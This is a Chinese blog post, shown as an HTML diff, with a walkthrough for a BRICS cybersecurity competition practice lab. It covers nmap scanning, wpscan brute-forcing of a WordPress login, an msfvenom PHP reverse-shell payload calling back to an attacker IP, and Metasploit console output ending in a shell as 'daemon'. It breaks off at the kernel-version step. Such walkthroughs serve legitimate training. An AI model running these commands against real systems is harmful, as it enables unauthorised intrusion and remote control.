@@ -1,0 +1,2166 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="网络安全国赛">
+    <meta name="description" content="记录自己的生活和学习的路程">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="baidu-site-verification" content="code-ZlodHEgStx" />
+    <meta name="google-site-verification" content="eTFvpWCZs6JdELwtanmffd4uRlCGHrHtBoZSBQt7z3U" />
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>网络安全金砖五国国赛-b模块-练习题 | 坂琴のBlog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+    <script src="https://kit.fontawesome.com/b594f1ef74.js" crossorigin="anonymous"></script>
+
+<style type="text/css" lang="css">
+    #loading-container{
+        position: fixed;
+        top: 0;
+        left: 0;
+        min-height: 100vh;
+        width: 100vw;
+        z-index: 9999;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        background: #FFF;
+        text-align: center;
+        /* loader页面消失采用渐隐的方式*/
+        -webkit-transition: opacity 1s ease;
+        -moz-transition: opacity 1s ease;
+        -o-transition: opacity 1s ease;
+        transition: opacity 1s ease;
+    }
+    .loading-image{
+        width: 120px;
+        height: 50px;
+        transform: translate(-50%);
+    }
+
+    .loading-image div:nth-child(2) {
+        -webkit-animation: pacman-balls 1s linear 0s infinite;
+        animation: pacman-balls 1s linear 0s infinite
+    }
+
+    .loading-image div:nth-child(3) {
+        -webkit-animation: pacman-balls 1s linear .33s infinite;
+        animation: pacman-balls 1s linear .33s infinite
+    }
+
+    .loading-image div:nth-child(4) {
+        -webkit-animation: pacman-balls 1s linear .66s infinite;
+        animation: pacman-balls 1s linear .66s infinite
+    }
+
+    .loading-image div:nth-child(5) {
+        -webkit-animation: pacman-balls 1s linear .99s infinite;
+        animation: pacman-balls 1s linear .99s infinite
+    }
+
+   .loading-image div:first-of-type {
+        width: 0;
+        height: 0;
+        border: 25px solid #49b1f5;
+        border-right-color: transparent;
+        border-radius: 25px;
+        -webkit-animation: rotate_pacman_half_up .5s 0s infinite;
+        animation: rotate_pacman_half_up .5s 0s infinite;
+    }
+    .loading-image div:nth-child(2) {
+        width: 0;
+        height: 0;
+        border: 25px solid #49b1f5;
+        border-right-color: transparent;
+        border-radius: 25px;
+        -webkit-animation: rotate_pacman_half_down .5s 0s infinite;
+        animation: rotate_pacman_half_down .5s 0s infinite;
+        margin-top: -50px;
+    }
+    @-webkit-keyframes rotate_pacman_half_up {0% {transform: rotate(270deg)}50% {transform: rotate(1turn)}to {transform: rotate(270deg)}}
+
+    @keyframes rotate_pacman_half_up {0% {transform: rotate(270deg)}50% {transform: rotate(1turn)}to {transform: rotate(270deg)}}
+
+    @-webkit-keyframes rotate_pacman_half_down {0% {transform: rotate(90deg)}50% {transform: rotate(0deg)}to {transform: rotate(90deg)}}
+
+    @keyframes rotate_pacman_half_down {0% {transform: rotate(90deg)}50% {transform: rotate(0deg)}to {transform: rotate(90deg)}}
+
+    @-webkit-keyframes pacman-balls {75% {opacity: .7}to {transform: translate(-100px, -6.25px)}}
+
+    @keyframes pacman-balls {75% {opacity: .7}to {transform: translate(-100px, -6.25px)}}
+
+
+    .loading-image div:nth-child(3),
+    .loading-image div:nth-child(4),
+    .loading-image div:nth-child(5),
+    .loading-image div:nth-child(6){
+        background-color: #49b1f5;
+        width: 15px;
+        height: 15px;
+        border-radius: 100%;
+        margin: 2px;
+        width: 10px;
+        height: 10px;
+        position: absolute;
+        transform: translateY(-6.25px);
+        top: 25px;
+        left: 100px;
+    }
+    .loading-text{
+        margin-bottom: 20vh;
+        text-align: center;
+        color: #2c3e50;
+        font-size: 2rem;
+        box-sizing: border-box;
+        padding: 0 10px;
+        text-shadow: 0 2px 10px rgba(0,0,0,0.2);
+    }
+    @media only screen and (max-width: 500px) {
+         .loading-text{
+            font-size: 1.5rem;
+         }
+    }
+    .fadeout {
+        opacity: 0;
+        filter: alpha(opacity=0);
+    }
+    /* logo出现动画 */
+    @-webkit-keyframes fadeInDown{0%{opacity:0;-webkit-transform:translate3d(0,-100%,0);transform:translate3d(0,-100%,0)}100%{opacity:1;-webkit-transform:none;transform:none}}
+    @keyframes fadeInDown{0%{opacity:0;-webkit-transform:translate3d(0,-100%,0);}}
+ </style>
+ <script>
+(function () {
+    const loaded = function(){
+       setTimeout(function(){
+            const loader = document.getElementById("loading-container");
+            loader.className="fadeout" ;//使用渐隐的方法淡出loading page
+            // document.getElementById("body-wrap").style.display="flex";
+            setTimeout(function(){
+                loader.style.display="none";
+            },1000); 
+        },1000);//强制显示loading page 1s  
+    };
+    loaded();
+})()
+ </script><meta name="generator" content="Hexo 6.0.0"></head>
+
+
+
+
+
+ <div id="loading-container">
+     <p class="loading-text">还在加载 请稍等一下辣ヾ(≧▽≦*)o . . . </p> 
+     <div class="loading-image">
+         <div></div>
+         <div></div>
+         <div></div>
+         <div></div> 
+         <div></div>
+     </div>
+ </div><body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">坂琴のBlog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/about">
+          
+          <i class="fas fa-archway" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>关于本站</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/aboutme">
+          
+          <i class="fas fa-user-circle" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>关于我</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fa-brands fa-bilibili" style="zoom: 0.6;"></i>
+      
+      <span>个人爱好</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/bangumis">
+          
+          <span>番剧</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">坂琴のBlog</div>
+        <div class="logo-desc">
+            
+            记录自己的生活和学习的路程
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>
+
+                  <a href="/about " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-archway" style="position: absolute;left:50px" ></i>
+			      
+		          <span>关于本站</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/aboutme " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-user-circle" style="position: absolute;left:50px" ></i>
+			      
+		          <span>关于我</span>
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fa-brands fa-bilibili"></i>
+			
+			个人爱好
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>
+
+                  <a href="/bangumis " style="margin-left:75px">
+				  
+		          <span>番剧</span>
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/images/baimao2.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">网络安全金砖五国国赛-b模块-练习题</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">网络安全</span>
+                            </a>
+                        
+                            <a href="/tags/%E9%9D%B6%E5%9C%BA/">
+                                <span class="chip bg-color">靶场</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%87%91%E7%A0%96%E4%BA%94%E5%9B%BD%E5%9B%BD%E8%B5%9B/" class="post-category">
+                                网络安全金砖五国国赛
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2022-10-20
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2023-09-23
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    3.4k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    13 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="二-B模块安全事件响应-网络安全数据取证-应用安全"><a href="#二-B模块安全事件响应-网络安全数据取证-应用安全" class="headerlink" title="二.B模块安全事件响应/网络安全数据取证/应用安全"></a>二.B模块安全事件响应/网络安全数据取证/应用安全</h1><h2 id="B-1-系统漏洞利用与提权"><a href="#B-1-系统漏洞利用与提权" class="headerlink" title="B-1.系统漏洞利用与提权"></a>B-1.系统漏洞利用与提权</h2><h3 id="1-使用nmap扫描靶机系统"><a href="#1-使用nmap扫描靶机系统" class="headerlink" title="1.使用nmap扫描靶机系统"></a>1.使用nmap扫描靶机系统</h3><blockquote>
+<p>1.使用nmap扫描靶机系统，将靶机开放的端口号按从小到大的顺序作为FLAG（形式：[端口1,端口2…,端口n]）提交；</p>
+</blockquote>
+<p>这里使用的是KALI系统扫描靶机IP地址，命令如下。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -A -T4 -p- <span class="token number">192.168</span>.10.76<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>具体如下图。</p>
+<p><img src="/images/wordimage/2022/1020/nmap.png"></p>
+<p>最终flag就是,<code>flag&#123;443,8080&#125;</code>。</p>
+<hr>
+<h3 id="2-弱口令进行登录"><a href="#2-弱口令进行登录" class="headerlink" title="2.弱口令进行登录"></a>2.弱口令进行登录</h3><blockquote>
+<p>2.通过上述端口访问靶机系统，使用弱口令进行登录，将正确的用户名和密码作为FLAG（形式：[用户名,密码]）提交；</p>
+</blockquote>
+<p>打开上面第一题获得的端口，如下图，发现是wordpress的CMS，如下图。</p>
+<p><img src="/images/wordimage/2022/1020/wordpress.png"></p>
+<p>之后根据题目要求提示，应该是wordpress后台没错了，我们就可以使用<code>wpscan</code>工具来进行暴力破解wordpress后台密码，命令如下，使用的字典是Kali自带的字典。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan --url http://192.168.10.76:8080/wordpress -P ./rockyou.txt -U rockyou.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>如下图，正在进行破解。</p>
+<p><img src="/images/wordimage/2022/1020/wordpress-passwd.png" alt="正在破解……"></p>
+<p>破解成功如下图。</p>
+<p><img src="/images/wordimage/2022/1020/passwd.png" alt="破解成功"></p>
+<blockquote>
+<p>账户：admin</p>
+<p>密码：123456</p>
+</blockquote>
+<p>之后我们就可以登录后台wordpress肯定是<code>wp-admin</code>如下图，进入了后台，然后我们就可以使用上图破解出来的密码，登录。</p>
+<p><img src="/images/wordimage/2022/1020/wp-admin.png"></p>
+<p>如下图，登录成功。</p>
+<p><img src="/images/wordimage/2022/1020/houtai.png"></p>
+<p>所以就获得了flag：<code>FLAG[admin,123456]</code></p>
+<hr>
+<h3 id="3-kali生成木马反弹"><a href="#3-kali生成木马反弹" class="headerlink" title="3. kali生成木马反弹"></a>3. kali生成木马反弹</h3><blockquote>
+<p>3.利用Kali渗透机生成反弹木马，将生成木马命令执行后提示的第四行的首个单词作为FLAG（形式：[单词]）提交；</p>
+</blockquote>
+<p>这里生成木马使用的是<code>msfvenom</code>工具，命令如下，因为是生成的网页木马。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom -p php/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.10.82 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> -f raw <span class="token operator">></span> ./shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>如下图，生成完毕之后根据题目要求得知flag为<code>FLAG[Payload]</code></p>
+<p><img src="/images/wordimage/2022/1020/payload.png"></p>
+<hr>
+<h3 id="4-木马上传靶机"><a href="#4-木马上传靶机" class="headerlink" title="4.木马上传靶机"></a>4.木马上传靶机</h3><blockquote>
+<p>对上述木马文件进行修改后上传到靶机系统中，使用MSF开启监听，将获得的当前权限的用户名作为FLAG（形式：[用户名]）</p>
+</blockquote>
+<p>打开msf搜索<code>wp_admin</code>如下图，找到了一个exploit，使用的exploit是</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use exploit/unix/webapp/wp_admin_shell_upload <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/images/wordimage/2022/1020/wp_admin.png"></p>
+<p>查看详细需求之后，设置IP地址和wordpress账户密码，具体操作如下图，设置完毕之后，直接就可以exploit了。</p>
+<p><img src="/images/wordimage/2022/1020/success.png"></p>
+<p>之后成功之后，我们就可以获取到用户名了，具体查看如下图。</p>
+<p><img src="/images/wordimage/2022/1020/daemon.png"></p>
+<p>所以就获得了FLAG，<code>FLAG[daemon]</code></p>
+<p>具体如下命令查看复制</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
+└─<span class="token comment"># msfconsole</span>
+                                                  
+<span class="token comment"># cowsay++</span>
+ ____________                                                                        
+<span class="token operator">&lt;</span> metasploit <span class="token operator">></span>                                                                       
+ ------------                                                                        
+       <span class="token punctuation">\</span>   ,__,                                                                      
+        <span class="token punctuation">\</span>  <span class="token punctuation">(</span>oo<span class="token punctuation">)</span>____                                                                  
+           <span class="token punctuation">(</span>__<span class="token punctuation">)</span>    <span class="token punctuation">)</span><span class="token punctuation">\</span>                                                                
+              <span class="token operator">||</span>--<span class="token operator">||</span> *                                                               
+                                                                                     
+
+       <span class="token operator">=</span><span class="token punctuation">[</span> metasploit v6.1.27-dev                          <span class="token punctuation">]</span>
++ -- --<span class="token operator">=</span><span class="token punctuation">[</span> <span class="token number">2196</span> exploits - <span class="token number">1162</span> auxiliary - <span class="token number">400</span> post       <span class="token punctuation">]</span>
++ -- --<span class="token operator">=</span><span class="token punctuation">[</span> <span class="token number">596</span> payloads - <span class="token number">45</span> encoders - <span class="token number">10</span> nops            <span class="token punctuation">]</span>
++ -- --<span class="token operator">=</span><span class="token punctuation">[</span> <span class="token number">9</span> evasion                                       <span class="token punctuation">]</span>
+
+Metasploit tip: You can pivot connections over sessions 
+started with the ssh_login modules
+
+msf6 <span class="token operator">></span> search wp_admin
+
+Matching Modules
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
+
+   <span class="token comment">#  Name                                       Disclosure Date  Rank       Check  Description</span>
+   -  ----                                       ---------------  ----       -----  -----------
+   <span class="token number">0</span>  exploit/unix/webapp/wp_admin_shell_upload  <span class="token number">2015</span>-02-21       excellent  Yes    WordPress Admin Shell Upload
+
+
+Interact with a module by name or index. For example info <span class="token number">0</span>, use <span class="token number">0</span> or use exploit/unix/webapp/wp_admin_shell_upload                                                       
+
+msf6 <span class="token operator">></span> use exploit/unix/webapp/wp_admin_shell_upload 
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> No payload configured, defaulting to php/meterpreter/reverse_tcp
+msf6 exploit<span class="token punctuation">(</span>unix/webapp/wp_admin_shell_upload<span class="token punctuation">)</span> <span class="token operator">></span> show options 
+
+Module options <span class="token punctuation">(</span>exploit/unix/webapp/wp_admin_shell_upload<span class="token punctuation">)</span>:
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD                    <span class="token function">yes</span>       The WordPress password to authenticate wit
+                                         h
+   Proxies                     no        A proxy chain of <span class="token function">format</span> type:host:port<span class="token punctuation">[</span>,ty
+                                         pe:host:port<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>
+   RHOSTS                      <span class="token function">yes</span>       The target host<span class="token punctuation">(</span>s<span class="token punctuation">)</span>, see https://github.com
+                                         /rapid7/metasploit-framework/wiki/Using-Me
+                                         tasploit
+   RPORT      <span class="token number">80</span>               <span class="token function">yes</span>       The target port <span class="token punctuation">(</span>TCP<span class="token punctuation">)</span>
+   SSL        <span class="token boolean">false</span>            no        Negotiate SSL/TLS <span class="token keyword">for</span> outgoing connections
+   TARGETURI  /                <span class="token function">yes</span>       The base path to the wordpress application
+   USERNAME                    <span class="token function">yes</span>       The WordPress username to authenticate wit
+                                         h
+   VHOST                       no        HTTP server virtual <span class="token function">host</span>
+
+
+Payload options <span class="token punctuation">(</span>php/meterpreter/reverse_tcp<span class="token punctuation">)</span>:
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  <span class="token number">192.168</span>.252.108  <span class="token function">yes</span>       The listen address <span class="token punctuation">(</span>an interface may be specif
+                                     ied<span class="token punctuation">)</span>
+   LPORT  <span class="token number">4444</span>             <span class="token function">yes</span>       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   <span class="token number">0</span>   WordPress
+
+
+msf6 exploit<span class="token punctuation">(</span>unix/webapp/wp_admin_shell_upload<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> RHOSTS <span class="token number">192.168</span>.252.78
+RHOSTS <span class="token operator">=</span><span class="token operator">></span> <span class="token number">192.168</span>.252.78
+msf6 exploit<span class="token punctuation">(</span>unix/webapp/wp_admin_shell_upload<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> password <span class="token number">123456</span>
+password <span class="token operator">=</span><span class="token operator">></span> <span class="token number">123456</span>
+msf6 exploit<span class="token punctuation">(</span>unix/webapp/wp_admin_shell_upload<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> username admin
+username <span class="token operator">=</span><span class="token operator">></span> admin
+msf6 exploit<span class="token punctuation">(</span>unix/webapp/wp_admin_shell_upload<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> rport <span class="token number">8080</span>
+rport <span class="token operator">=</span><span class="token operator">></span> <span class="token number">8080</span>
+msf6 exploit<span class="token punctuation">(</span>unix/webapp/wp_admin_shell_upload<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> TARGETURI /wordpress
+TARGETURI <span class="token operator">=</span><span class="token operator">></span> /wordpress
+msf6 exploit<span class="token punctuation">(</span>unix/webapp/wp_admin_shell_upload<span class="token punctuation">)</span> <span class="token operator">></span> run
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span>.252.108:4444 
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Authenticating with WordPress using admin:123456<span class="token punctuation">..</span>.
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Authenticated with WordPress
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Preparing payload<span class="token punctuation">..</span>.
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Uploading payload<span class="token punctuation">..</span>.
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Executing the payload at /wordpress/wp-content/plugins/yLIryRMHSZ/PhFpQUTpUW.php<span class="token punctuation">..</span>.
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">39282</span> bytes<span class="token punctuation">)</span> to <span class="token number">192.168</span>.252.78
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Deleted PhFpQUTpUW.php
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Deleted yLIryRMHSZ.php
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Deleted <span class="token punctuation">..</span>/yLIryRMHSZ
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session <span class="token number">1</span> opened <span class="token punctuation">(</span><span class="token number">192.168</span>.252.108:4444 -<span class="token operator">></span> <span class="token number">192.168</span>.252.78:34785 <span class="token punctuation">)</span> at <span class="token number">2022</span>-10-20 <span class="token number">22</span>:34:52 +0800
+
+meterpreter <span class="token operator">></span> shell
+Process <span class="token number">1454</span> created.
+Channel <span class="token number">0</span> created.
+sh: <span class="token number">0</span>: getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span> failed: No such <span class="token function">file</span> or directory
+sh: <span class="token number">0</span>: getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span> failed: No such <span class="token function">file</span> or directory
+<span class="token function">whoami</span>
+daemon<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<hr>
+<h3 id="5-查看系统内核版本信息"><a href="#5-查看系统内核版本信息" class="headerlink" title="5.查看系统内核版本信息"></a>5.查看系统内核版本信息</h3><blockquote>
+<p>5.查看系统内核版本信息，将系统内核版本号作为FLAG（形式：[版本号]）提交；</p>
+</blockquote>
+<p>使用命令如下。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">uname</span> -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>具体如下图。</p>
